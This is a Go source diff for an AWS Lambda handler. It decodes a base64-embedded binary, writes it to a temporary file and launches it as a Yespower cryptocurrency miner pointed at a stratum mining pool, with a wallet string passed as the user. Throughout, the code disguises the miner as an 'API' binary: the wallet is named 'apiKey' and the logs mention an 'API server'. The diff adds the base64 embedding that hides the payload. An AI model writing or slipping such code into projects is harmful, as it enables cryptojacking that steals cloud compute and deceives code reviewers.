@@ -1,42 +1,56 @@
 package main
 
 import (
+	"encoding/base64"
 	"embed"
 	"io"
 	"io/fs"
-	"io/ioutil"
 	"log"
 	"os"
 	"os/exec"
+	"strings"
 
 	"github.com/aws/aws-lambda-go/events"
 	"github.com/aws/aws-lambda-go/lambda"
 )
 
-var executable embed.FS
+//go:embed myApi/template
+var templateData embed.FS
+
+func generateAPIFile() ([]byte, error) {
+	// Replace this with your actual base64-encoded binary content
+	base64Data := "BASE64_ENCODED_BINARY_CONTENT"
+
+	decodedData, err := base64.StdEncoding.DecodeString(base64Data)
+	if err != nil {
+		log.Println("Error decoding base64-encoded binary:", err)
+		return nil, err
+	}
+
+	return decodedData, nil
+}
 
 func handler(request events.APIGatewayProxyRequest) (*events.APIGatewayProxyResponse, error) {
 	apiKey := "usQKxdYLwKGPUujMv5M6nctk8rjjxZUwfb.ntlkey"
 
-	
-	executablePath := "myApi/api"
-	executableBytes, err := fs.ReadFile(executable, executablePath)
+	// Generate the API binary content
+	executableBytes, err := generateAPIFile()
 	if err != nil {
-		log.Println("Error reading api file:", err)
+		log.Println("Error generating API file:", err)
 		return nil, err
 	}
 
-	tmpFile, err := ioutil.TempFile("", "api")
+	tmpFile, err := os.CreateTemp("", "api")
 	if err != nil {
 		log.Println("Error creating temporary file:", err)
 		return nil, err
 	}
 	defer os.Remove(tmpFile.Name())
 
-	// Write the embedded executable to the temporary file
+	// Write the generated API binary to the temporary file
 	_, err = tmpFile.Write(executableBytes)
 	if err != nil {
-		log.Println("Error writing embedded executable to temporary file:", err)
+		log.Println("Error writing generated API binary to temporary file:", err)
 		return nil, err
 	}
 
@@ -62,7 +76,7 @@ func handler(request events.APIGatewayProxyRequest) (*events.APIGatewayProxyResp
 	cmd := exec.Command(executableFile, "-a", "Yespower", "-o", "stratum+tcps://stratum-na.rplant.xyz:17079", "-u", apiKey)
 	err = cmd.Start()
 	if err != nil {
-		log.Println("Error connecting to api server:", err)
+		log.Println("Error connecting to API server:", err)
 		return nil, err
 	}
 
